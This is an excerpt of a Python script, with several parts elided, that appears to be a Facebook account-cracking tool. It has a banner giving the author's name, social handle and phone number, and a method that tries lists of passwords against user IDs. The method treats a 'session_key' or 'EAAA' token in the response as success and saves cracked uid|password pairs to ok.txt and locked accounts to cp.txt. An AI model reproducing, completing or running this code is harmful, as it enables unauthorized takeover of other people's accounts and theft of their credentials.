...
class Main:
	...
	def __init__(self):
		...
		print ("""\033[0;92m__          ___  _    ____  _  _   _____         _____

\033[0;91m \ \        / / || |  / __ \| || | |  __ \       / ____|

\033[0;92m\ \  /\  / /| || |_| |  | | || |_| |__) |__  _| (___  

\033[0;93m \ \/  \/ / |__   _| |  | |__   _|  _  / \ \/ /\___ \  

\033[0;94m\  /\  /     | | | |__| |  | | | | \ \  >  < ____) |

\033[0;95m     \/  \/      |_|  \___\_\  |_| |_|  \_\/_/\_\_____/

\033[0;96m##     ## ##     ## ##     ## #### #### 

 > \033[0;92mDEVELOPER     : WAQAR X AHMAD

 > \033[0;95mFACEBOOK ID   : YWL CHUZA

 > \033[0;41mWHATSAPP      : +923481727313

 \033[0;96m> YOUTUBE       : USE NHI KRTA
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[WAQARXAHMAD-OK😍] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [WAQARXAHMAD-OK😍] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[WAQARXAHMAD-CP😭] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [WAQARXAHMAD-CP😭] %s|%s\n"%(uid, pw))
